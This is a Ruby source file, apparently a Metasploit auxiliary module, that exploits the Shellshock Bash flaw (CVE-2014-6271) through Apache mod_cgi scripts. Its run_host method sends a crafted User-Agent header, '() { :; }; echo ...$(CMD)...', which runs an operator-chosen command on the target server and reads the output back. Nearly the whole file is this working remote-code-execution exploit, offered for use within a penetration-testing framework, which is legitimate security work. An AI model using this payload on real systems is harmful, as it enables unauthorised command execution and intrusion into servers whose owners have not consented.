##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
      'Description' => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting Apache mod_cgi scripts through
        the HTTP_USER_AGENT variable.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'wvu' # Metasploit module
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
      ],
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptEnum.new('METHOD', [true, 'HTTP method to use', 'GET',
        ['GET', 'POST']]),
      OptString.new('CMD', [true, 'Command to run (absolute paths required)',
        '/usr/bin/id'])
    ], self.class)
  end

  def run_host(ip)
    marker = Rex::Text.rand_text_alphanumeric(rand(42) + 1)

    res = send_request_raw(
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path),
      'agent' => %Q{() { :; }; echo "#{marker}$(#{datastore['CMD']})#{marker}"}
    )

    if res && res.body =~ /#{marker}(.+)#{marker}/m
      print_good("#{peer} - #{$1}")
      report_vuln(
        :host => ip,
        :port => rport,
        :name => self.name,
        :refs => self.references
      )
    end
  end

end
